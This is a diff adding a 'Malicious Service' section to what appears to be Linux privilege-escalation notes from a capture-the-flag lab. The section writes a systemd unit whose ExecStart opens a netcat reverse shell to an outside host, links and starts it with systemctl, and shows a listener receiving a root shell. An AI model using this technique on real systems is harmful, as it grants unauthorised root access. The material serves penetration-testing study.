@@ -778,6 +778,51 @@ rpm –qa | grep <program>oftenoften
 
 3. Search for exploits.
 
+## Malicious Service
+
+A service is defined by a `.service` file. The `systemctl` is used to link it to `systemd`, and then used again to start the service. What the service does is defined by the `.service` file.
+
+ [gtfobins](https://gtfobins.github.io/gtfobins/systemctl/) has a page for `systemctl`, and it gives an example where a single command is executed and output to a file in `tmp`.
+
+```text
+pepper@jarvis:/dev/shm$ cat >evil.service<<EOF
+[Service]
+Type=notify
+ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.16.8 443'
+KillMode=process
+Restart=on-failure
+RestartSec=42s
+
+[Install]
+WantedBy=multi-user.target
+EOF
+```
+
+Now link this service:
+
+```text
+pepper@jarvis:/dev/shm$ systemctl link /dev/shm/evil.service
+```
+
+Now start the service, with a `nc` listener ready to catch the shell:
+
+```text
+pepper@jarvis:/dev/shm$ systemctl start evil
+```
+
+Receive the shell:
+
+```text
+kali@kali$ sudo nc -lnvp 443
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.143.
+Ncat: Connection from 10.10.10.143:37150.
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
 ## Passwords, Hashes, and Credentials
 
 We can enumerate possible files that may contain credentials.
